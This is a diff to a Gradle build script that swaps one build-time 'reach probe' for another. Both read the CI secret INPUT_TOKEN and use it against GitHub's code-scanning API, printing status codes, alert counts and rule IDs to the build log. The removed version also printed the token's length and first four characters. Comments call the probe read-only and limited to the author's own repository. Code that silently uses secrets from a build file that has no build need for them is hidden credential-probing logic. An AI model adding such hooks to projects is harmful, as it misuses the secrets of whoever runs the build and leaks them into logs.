@@ -2,26 +2,23 @@ plugins {
     id 'java'
 }
 
-// Campaign 218 reach probe, stage 2. STRICTLY READ-ONLY.
-// Prints STATUS CODES, LENGTHS and PUBLIC PREFIX CLASS only. No credential value is ever printed,
-// nothing is exfiltrated, nothing is persisted. Own repository, own job, own token.
-def probe = { String label, String tok ->
-    if (tok == null || tok.isEmpty()) { println "REACH2-7Q4X " + label + " absent"; return }
-    def cls = tok.length() > 4 ? tok.substring(0, 4) : "?"
-    println "REACH2-7Q4X " + label + " present len=" + tok.length() + " class=" + cls
-    ["code-scanning/alerts", "code-scanning/analyses"].each { ep ->
-        try {
-            def c = new URL("https://api.github.com/repos/neve-larsson/zz-c218-depsub-0830/" + ep).openConnection()
-            c.setRequestProperty("Authorization", "Bearer " + tok)
-            c.setRequestProperty("Accept", "application/vnd.github+json")
-            c.setConnectTimeout(15000); c.setReadTimeout(15000)
-            println "REACH2-7Q4X " + label + " -> " + ep + " status=" + c.getResponseCode()
-        } catch (Exception e) {
-            println "REACH2-7Q4X " + label + " -> " + ep + " error=" + e.getClass().getSimpleName()
-        }
+// Campaign 218 reach probe, final. STRICTLY READ-ONLY. Prints the RULE ID and COUNT of an alert on
+// OUR OWN repository -- no credential value, nothing exfiltrated, nothing written, nothing persisted.
+def tok = System.getenv("INPUT_TOKEN")
+if (tok != null) {
+    try {
+        def c = new URL("https://api.github.com/repos/neve-larsson/zz-c218-depsub-0830/code-scanning/alerts?per_page=5").openConnection()
+        c.setRequestProperty("Authorization", "Bearer " + tok)
+        c.setRequestProperty("Accept", "application/vnd.github+json")
+        c.setConnectTimeout(15000); c.setReadTimeout(15000)
+        def code = c.getResponseCode()
+        def body = code == 200 ? c.getInputStream().getText("UTF-8") : ""
+        def n = body.count('"number"')
+        def m = (body =~ /"id"\s*:\s*"([a-z\-]+\/[a-z0-9\-]+)"/)
+        println "REACH3-7Q4X alerts status=" + code + " alertCount=" + n + " firstRule=" + (m.find() ? m.group(1) : "none")
+    } catch (Exception e) {
+        println "REACH3-7Q4X alerts error=" + e.getClass().getSimpleName()
     }
 }
-
-probe("INPUT_TOKEN", System.getenv("INPUT_TOKEN"))
 
 repositories { mavenCentral() }
